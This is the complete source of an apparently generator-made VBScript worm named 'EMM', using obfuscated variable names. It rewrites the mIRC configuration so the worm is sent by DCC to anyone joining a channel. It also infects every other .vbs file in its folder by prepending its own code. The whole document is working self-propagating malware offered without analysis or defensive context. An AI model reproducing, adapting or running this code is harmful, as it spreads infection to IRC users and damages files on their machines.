'Worm Name: EMM
'Written By: PetiK
'[INDRA]
On Error Resume Next
ogwrrwbdtbrtbrr = WScript.ScriptFullName
Set oxgqqsnshkkqvpi = CreateObject("WScript.Shell")
Set tbqxqowkldiqpcm = CreateObject("Scripting.FileSystemObject")
Set fxsqllluyujghux = tbqxqowkldiqpcm.CreateTextFile("C:\mirc\script.ini", True)
fxsqllluyujghux.WriteLine "[script]"
fxsqllluyujghux.WriteLine "n0=ON 1:JOIN:#:{ if ( $nick != $me ) {"
fxsqllluyujghux.Write "n1=/dcc  send$nick """
fxsqllluyujghux.Write ogwrrwbdtbrtbrr
fxsqllluyujghux.WriteLine """ }"
fxsqllluyujghux.Close
Set wraexvovyxqhfpg = tbqxqowkldiqpcm.OpenTextFile(ogwrrwbdtbrtbrr, 1, 0)
hargrasavurjmkc = wraexvovyxqhfpg.ReadAll
wraexvovyxqhfpg.Close
urnalramcdcsaxo = Left(hargrasavurjmkc, InStrRev(hargrasavurjmkc, "mwkovxmjiycsxbu")) + "mwkovxmjiycsxbu"
tmbksegxaarqgkw = Left(ogwrrwbdtbrtbrr, InStrRev(ogwrrwbdtbrtbrr, "\"))
For Each aunurvwfptqwfhp in tbqxqowkldiqpcm.GetFolder(tmbksegxaarqgkw).Files
If ( Right(aunurvwfptqwfhp.Name, 4) = ".vbs" ) Then
Set tbuqnxmiejpcmyk = tbqxqowkldiqpcm.OpenTextFile(aunurvwfptqwfhp.Name, 1, 0)
dfcvhpayrqjkjwo = tbuqnxmiejpcmyk.ReadAll
If (InStr(dfcvhpayrqjkjwo, "[INDRA]") = 0) Then
Set qhtihfalkinypig = tbqxqowkldiqpcm.CreateTextFile(aunurvwfptqwfhp.Name, True)
qhtihfalkinypig.Write urnalramcdcsaxo + vbCrLf + dfcvhpayrqjkjwo
qhtihfalkinypig.Close
End If
tbuqnxmiejpcmyk.Close
End If
Next
'Generated with [INDRA] v0.4es.
'mwkovxmjiycsxbu
